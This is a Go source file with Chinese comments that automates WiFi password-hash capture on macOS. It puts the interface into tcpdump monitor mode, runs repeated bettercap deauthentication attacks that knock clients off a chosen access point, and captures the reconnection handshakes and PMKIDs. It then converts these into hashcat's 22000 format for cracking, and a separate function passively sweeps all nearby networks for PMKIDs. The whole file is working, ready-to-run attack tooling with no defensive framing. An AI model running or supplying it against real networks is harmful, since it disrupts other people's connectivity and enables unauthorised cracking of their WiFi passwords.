package capture

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ============================================================
// 握手包/PMKID捕获模块
// 基于tcpdump监控模式 + bettercap反认证攻击
// 适配macOS 26.3（airport已移除，使用tcpdump -I替代）
// ============================================================

// ============================================================
// CaptureResult 捕获结果
// ============================================================
type CaptureResult struct {
	SSID        string        // 目标网络名称
	BSSID       string        // 目标MAC地址
	Channel     int           // 信道
	BeaconFile  string        // beacon捕获文件路径
	HandFile    string        // 握手包捕获文件路径
	MergedFile  string        // 合并后的cap文件路径
	HashFile    string        // hashcat格式哈希文件路径
	HasPMKID    bool          // 是否包含PMKID
	HasHandshk  bool          // 是否包含完整握手
	Duration    time.Duration // 捕获耗时
	Success     bool          // 是否成功
	Error       string        // 错误信息
}

// ============================================================
// CaptureConfig 捕获配置
// ============================================================
type CaptureConfig struct {
	Interface     string        // WiFi接口名（默认en0）
	OutputDir     string        // 输出目录
	BeaconTimeout time.Duration // beacon捕获超时
	HandTimeout   time.Duration // 握手包捕获超时
	DeauthCount   int           // deauth发送轮数
	DeauthDelay   time.Duration // deauth间隔
	Verbose       bool          // 详细日志
}

// ============================================================
// DefaultCaptureConfig 默认捕获配置
// ============================================================
func DefaultCaptureConfig() CaptureConfig {
	return CaptureConfig{
		Interface:     "en0",
		OutputDir:     "captures",
		BeaconTimeout: 10 * time.Second,
		HandTimeout:   60 * time.Second,
		DeauthCount:   3,
		DeauthDelay:   3 * time.Second,
		Verbose:       true,
	}
}

// ============================================================
// CheckTools 检查所需工具是否已安装
// 返回: 缺失工具列表
// ============================================================
func CheckTools() []string {
	// 必需工具列表
	required := map[string]string{
		"tcpdump":       "系统自带",
		"mergecap":      "brew install wireshark",
		"hcxpcapngtool": "brew install hcxtools",
		"bettercap":     "brew install bettercap",
	}

	var missing []string
	for tool, hint := range required {
		if _, err := exec.LookPath(tool); err != nil {
			missing = append(missing, fmt.Sprintf("%s (%s)", tool, hint))
		}
	}
	return missing
}

// ============================================================
// CaptureHandshake 完整的握手包捕获流程
// 流程: disassociate → tcpdump监控捕获(beacon+EAPOL) → bettercap deauth → 等待 → 转hashcat
// 注意: tcpdump和bettercap不能同时以不同模式操作同一接口
// 正确做法: 先启动tcpdump监控，然后用bettercap发deauth，最后停止tcpdump
// ============================================================
func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) CaptureResult {
	start := time.Now()
	result := CaptureResult{
		SSID:    ssid,
		BSSID:   bssid,
		Channel: channel,
	}

	// 创建输出目录
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		result.Error = fmt.Sprintf("创建输出目录失败: %v", err)
		return result
	}

	// 生成文件名前缀（SSID可能含特殊字符，用BSSID做文件名）
	safeName := strings.ReplaceAll(bssid, ":", "")
	result.BeaconFile = filepath.Join(cfg.OutputDir, safeName+"_beacon.cap")
	result.HandFile = filepath.Join(cfg.OutputDir, safeName+"_handshake.cap")
	result.MergedFile = filepath.Join(cfg.OutputDir, safeName+"_capture.cap")
	result.HashFile = filepath.Join(cfg.OutputDir, safeName+"_hash.22000")

	// 清理旧文件（避免上次残留影响判断）
	os.Remove(result.BeaconFile)
	os.Remove(result.HandFile)
	os.Remove(result.MergedFile)
	os.Remove(result.HashFile)

	logf := func(format string, args ...interface{}) {
		if cfg.Verbose {
			fmt.Printf("    "+format+"\n", args...)
		}
	}

	// ── 步骤1: 断开当前WiFi连接（disassociate，让接口可进入监控模式） ──
	logf("[1/5] 断开当前WiFi连接...")
	// 用networksetup disassociate，不关电（关电会导致tcpdump无法使用接口）
	runCmd("sudo", "networksetup", "-setairportnetwork", cfg.Interface, "")
	time.Sleep(1 * time.Second)

	// ── 步骤2: 启动tcpdump全量捕获（beacon + EAPOL一起抓） ──
	logf("[2/5] 启动tcpdump监控模式捕获（beacon+EAPOL）...")
	ctx, cancel := context.WithTimeout(context.Background(), cfg.HandTimeout)
	defer cancel()

	// 捕获目标AP的所有管理帧和EAPOL帧（一次tcpdump完成，避免接口竞争）
	// 过滤条件: beacon帧 或 EAPOL帧，且与目标BSSID相关
	capFilter := fmt.Sprintf("(type mgt subtype beacon and ether src %s) or (ether proto 0x888e and ether host %s)", bssid, bssid)
	capFile := filepath.Join(cfg.OutputDir, safeName+"_all.cap")
	os.Remove(capFile)

	tcpCmd := exec.CommandContext(ctx, "sudo", "tcpdump",
		capFilter,
		"-I",                // 监控模式
		"-U",                // 无缓冲写入
		"-i", cfg.Interface,
		"-w", capFile,
	)
	tcpCmd.Stderr = os.Stderr
	if err := tcpCmd.Start(); err != nil {
		result.Error = fmt.Sprintf("启动tcpdump失败: %v", err)
		return result
	}

	// 等待2秒让tcpdump稳定进入监控模式
	time.Sleep(2 * time.Second)

	// ── 步骤3: 发送deauth攻击（在另一个进程中，不干扰tcpdump） ──
	logf("[3/5] 发送反认证攻击（%d轮，间隔%s）...", cfg.DeauthCount, cfg.DeauthDelay)
	sendDeauth(bssid, cfg)

	// ── 步骤4: 继续等待握手包（deauth后客户端重连需要时间） ──
	logf("[4/5] 等待客户端重连并捕获握手包（剩余%s）...", cfg.HandTimeout)
	waitForHandshake(tcpCmd, ctx)

	// 确保 tcpdump 已停止
	if tcpCmd.Process != nil {
		tcpCmd.Process.Signal(os.Interrupt)
		time.Sleep(500 * time.Millisecond)
		tcpCmd.Process.Kill()
	}
	tcpCmd.Wait()

	// ── 步骤5: 转换格式 ──
	logf("[5/5] 转换数据包为hashcat格式...")
	// 直接用捕获文件转换（已包含beacon+EAPOL，无需merge）
	result.MergedFile = capFile
	convertOK, hasPMKID, hasHand := convertToHashcat(result)
	result.HasPMKID = hasPMKID
	result.HasHandshk = hasHand
	result.Success = convertOK && (hasPMKID || hasHand)
	if result.Success {
		logf("  ✓ 转换成功 (PMKID=%v, 握手=%v)", hasPMKID, hasHand)
	} else {
		logf("  ✗ 无有效PMKID或握手包")
		result.Error = "未捕获到有效的PMKID或握手包"
	}

	result.Duration = time.Since(start)
	return result
}

// ============================================================
// captureBeacon 捕获目标AP的beacon帧
// 使用tcpdump -I（监控模式）捕获802.11管理帧
// ============================================================
func captureBeacon(ssid, bssid string, cfg CaptureConfig) bool {
	safeName := strings.ReplaceAll(bssid, ":", "")
	outFile := filepath.Join(cfg.OutputDir, safeName+"_beacon.cap")

	// 使用tcpdump的-I标志进入监控模式捕获beacon
	// 过滤条件：管理帧中的beacon子类型，且源MAC为目标BSSID
	filter := fmt.Sprintf("type mgt subtype beacon and ether src %s", bssid)

	ctx, cancel := context.WithTimeout(context.Background(), cfg.BeaconTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
		filter,
		"-I",             // 监控模式
		"-c", "1",        // 只捕获1个包
		"-i", cfg.Interface,
		"-w", outFile,
	)
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil && ctx.Err() != context.DeadlineExceeded {
		return false
	}

	// 检查文件是否存在且有内容
	info, err := os.Stat(outFile)
	return err == nil && info.Size() > 24 // pcap文件头至少24字节
}

// ============================================================
// startHandshakeCapture 启动EAPOL握手包捕获（后台运行）
// ============================================================
func startHandshakeCapture(ctx context.Context, bssid string, cfg CaptureConfig) *exec.Cmd {
	safeName := strings.ReplaceAll(bssid, ":", "")
	outFile := filepath.Join(cfg.OutputDir, safeName+"_handshake.cap")

	// 捕获EAPOL帧（802.1X认证帧，包含四次握手和PMKID）
	filter := fmt.Sprintf("ether proto 0x888e and ether host %s", bssid)

	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
		filter,
		"-I",                // 监控模式
		"-U",                // 无缓冲写入
		"-i", cfg.Interface,
		"-w", outFile,
	)
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		return nil
	}

	return cmd
}

// ============================================================
// waitForHandshake 等待握手包捕获完成
// ============================================================
func waitForHandshake(cmd *exec.Cmd, ctx context.Context) bool {
	// 等待命令结束（超时或手动取消）
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-ctx.Done():
		// 超时，终止tcpdump
		if cmd.Process != nil {
			cmd.Process.Signal(os.Interrupt)
			time.Sleep(500 * time.Millisecond)
			cmd.Process.Kill()
		}
		// 检查是否已经捕获到了数据
		return true // 即使超时也返回true，后续检查文件内容
	case err := <-done:
		return err == nil
	}
}

// ============================================================
// sendDeauth 通过bettercap发送反认证攻击
// 注意: bettercap不支持sleep命令，改用多次独立调用+Go层间隔
// bettercap会自己管理WiFi接口，不会干扰已在运行的tcpdump
// ============================================================
func sendDeauth(bssid string, cfg CaptureConfig) {
	for i := 0; i < cfg.DeauthCount; i++ {
		if cfg.Verbose {
			fmt.Printf("      deauth轮次 %d/%d → %s\n", i+1, cfg.DeauthCount, bssid)
		}

		// bettercap -eval中用分号分隔命令，不能用sleep
		// 正确做法: wifi.recon on → 等待发现目标 → wifi.deauth → quit
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		evalCmd := fmt.Sprintf("wifi.recon on; wifi.deauth %s; wifi.deauth %s; wifi.deauth %s; quit", bssid, bssid, bssid)
		cmd := exec.CommandContext(ctx, "sudo", "bettercap",
			"-iface", cfg.Interface,
			"-eval", evalCmd,
		)
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.Run()
		cancel()

		if i < cfg.DeauthCount-1 {
			time.Sleep(cfg.DeauthDelay)
		}
	}
}

// ============================================================
// mergeCaptures 合并beacon和握手包文件
// ============================================================
func mergeCaptures(cfg CaptureConfig, result CaptureResult) bool {
	// 检查哪些文件存在
	var files []string
	if fileExists(result.BeaconFile) {
		files = append(files, result.BeaconFile)
	}
	if fileExists(result.HandFile) {
		files = append(files, result.HandFile)
	}

	if len(files) == 0 {
		return false
	}

	// 只有一个文件时直接复制
	if len(files) == 1 {
		data, err := os.ReadFile(files[0])
		if err != nil {
			return false
		}
		return os.WriteFile(result.MergedFile, data, 0644) == nil
	}

	// 使用mergecap合并
	args := []string{"-a", "-F", "pcap", "-w", result.MergedFile}
	args = append(args, files...)
	cmd := exec.Command("mergecap", args...)
	return cmd.Run() == nil
}

// ============================================================
// convertToHashcat 将pcap文件转换为hashcat可用的22000格式
// 返回: (转换是否成功, 是否包含PMKID, 是否包含握手)
// ============================================================
func convertToHashcat(result CaptureResult) (bool, bool, bool) {
	inputFile := result.MergedFile
	if !fileExists(inputFile) {
		return false, false, false
	}

	// 使用hcxpcapngtool转换
	cmd := exec.Command("hcxpcapngtool",
		"-o", result.HashFile,
		inputFile,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, false, false
	}

	// 解析hcxpcapngtool输出，判断是否包含PMKID和握手包
	// hcxpcapngtool输出示例:
	//   PMKID(s) (EAPOL from AP).....: 2
	//   WPA handshakes...............: 1
	outStr := string(output)
	hasPMKID := false
	hasHand := false
	for _, line := range strings.Split(outStr, "\n") {
		line = strings.TrimSpace(line)
		// 检测PMKID数量 > 0
		if strings.Contains(line, "PMKID") && strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				countStr := strings.TrimSpace(parts[len(parts)-1])
				if countStr != "0" && countStr != "" {
					hasPMKID = true
				}
			}
		}
		// 检测握手包数量 > 0
		if strings.Contains(line, "handshake") && strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				countStr := strings.TrimSpace(parts[len(parts)-1])
				if countStr != "0" && countStr != "" {
					hasHand = true
				}
			}
		}
	}

	// 检查哈希文件是否有内容
	if !fileExists(result.HashFile) {
		return false, false, false
	}
	info, _ := os.Stat(result.HashFile)
	return info.Size() > 0, hasPMKID, hasHand
}

// ============================================================
// QuickPMKIDScan 快速PMKID扫描（不需要deauth，被动捕获）
// 对多个目标同时监听，尝试获取PMKID
// ============================================================
func QuickPMKIDScan(iface, outputDir string, duration time.Duration, verbose bool) string {
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return ""
	}

	outFile := filepath.Join(outputDir, "pmkid_scan.cap")
	hashFile := filepath.Join(outputDir, "pmkid_scan.22000")

	if verbose {
		fmt.Printf("    [*] PMKID被动扫描（%s）...\n", duration)
	}

	// 使用tcpdump捕获所有EAPOL帧
	ctx, cancel := context.WithTimeout(context.Background(), duration)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
		"ether proto 0x888e",
		"-I",
		"-U",
		"-i", iface,
		"-w", outFile,
	)
	cmd.Run()

	// 转换为hashcat格式
	if !fileExists(outFile) {
		return ""
	}

	convCmd := exec.Command("hcxpcapngtool", "-o", hashFile, outFile)
	convCmd.Run()

	if fileExists(hashFile) {
		info, _ := os.Stat(hashFile)
		if info.Size() > 0 {
			return hashFile
		}
	}
	return ""
}

// ============================================================
// ParseHashFile 解析hashcat格式文件，提取目标信息
// 返回: SSID列表
// ============================================================
func ParseHashFile(hashFile string) []string {
	f, err := os.Open(hashFile)
	if err != nil {
		return nil
	}
	defer f.Close()

	var ssids []string
	seen := make(map[string]bool)
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		// hashcat 22000格式: WPA*TYPE*PMKID/MIC*MAC_AP*MAC_STA*ESSID_HEX*...
		parts := strings.Split(line, "*")
		if len(parts) >= 6 {
			// ESSID是第6个字段（hex编码）
			essidHex := parts[5]
			essid := hexToString(essidHex)
			if essid != "" && !seen[essid] {
				seen[essid] = true
				ssids = append(ssids, essid)
			}
		}
	}
	return ssids
}

// ============================================================
// 内部辅助函数
// ============================================================

// runCmd 执行命令（忽略错误）
func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Run()
}

// fileExists 检查文件是否存在且有内容
func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Size() > 0
}

// hexToString 将hex字符串转为ASCII
func hexToString(hexStr string) string {
	if len(hexStr)%2 != 0 {
		return ""
	}
	var result []byte
	for i := 0; i < len(hexStr); i += 2 {
		b := hexCharToByte(hexStr[i])<<4 | hexCharToByte(hexStr[i+1])
		if b == 0 {
			break
		}
		result = append(result, b)
	}
	return string(result)
}

func hexCharToByte(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	default:
		return 0
	}
}
